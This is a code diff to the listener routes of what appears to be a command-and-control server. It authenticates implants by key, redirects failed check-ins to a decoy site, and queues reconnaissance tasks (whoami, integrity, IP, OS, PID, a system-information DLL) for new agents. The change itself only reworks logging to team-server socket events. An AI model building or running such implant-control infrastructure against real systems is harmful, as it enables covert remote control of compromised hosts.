@@ -10,8 +10,8 @@ from connect.server.models import AgentModel, get_session, ImplantModel, TaskMod
 
 class ListenerRoutes:
 
-    def __init__(self, aiohttp_app, sio_client, task_manager):
-        self.sio_client = sio_client
+    def __init__(self, aiohttp_app, sio_team_server, task_manager):
+        self.sio_team_server = sio_team_server
         self.aiohttp_app = aiohttp_app
         self.aiohttp_app.router.add_get(r'/{route:[^\/socket.io\/].*}', self.dummy_route)
         self.aiohttp_app.router.add_post('/{route:.*}', self.check_in)
@@ -33,16 +33,21 @@ class ListenerRoutes:
 
         if isinstance(batch_response, dict):
             with get_session() as session:
-                display('Retrieved implant authentication: ' + str(batch_response), 'INFORMATION')
-                implant = session.query(ImplantModel).filter_by(key=batch_response['id']).first()
-                if not implant:
-                    display(f'Failed to find implant with id {batch_response["id"]}', 'ERROR')
+                if 'id' not in batch_response:
                     return web.HTTPFound("https://www.google.com")
-                return web.Response(text=self.create_agent(implant, session))
+                implant_key = batch_response['id']
+                await self.sio_team_server.emit('information', f'Implant authenticating with {implant_key}')
+                implant = session.query(ImplantModel).filter_by(key=implant_key).first()
+                if not implant:
+                    await self.sio_team_server.emit('error', f'Failed to authenticate Implant with {implant_key}')
+                    return web.HTTPFound("https://www.google.com")
+                await self.sio_team_server.emit('success', f'Successfully authenticated Implant with {implant_key}')
+                response = await self.create_agent(implant, session)
+                return web.Response(text=response)
         batch_request = await self.task_manager.parse_batch_response(batch_response)
         return web.json_response(batch_request)
 
-    def create_agent(self, implant, session):
+    async def create_agent(self, implant, session):
         agent = AgentModel(implant=implant)
         module_bytes = open(f'{os.getcwd()}/resources/modules/SystemInformation.dll', 'rb').read()
         module_md5 = hashlib.md5(module_bytes).hexdigest()
@@ -57,5 +62,5 @@ class ListenerRoutes:
         pid_task = TaskModel(agent=agent, method='pid', type=-1, parameters='', misc='')
         session.add_all([agent, load_task, whoami_task, integrity_task, ip_task, os_task, pid_task])
         session.commit()
-        display(f'Created agent {agent.id} sending it to implant {implant.id}', 'INFORMATION')
+        await self.sio_team_server.emit('information', f'Attempting to upgrade Implant to Agent {agent.id}')
         return str(agent.check_in_task_id)
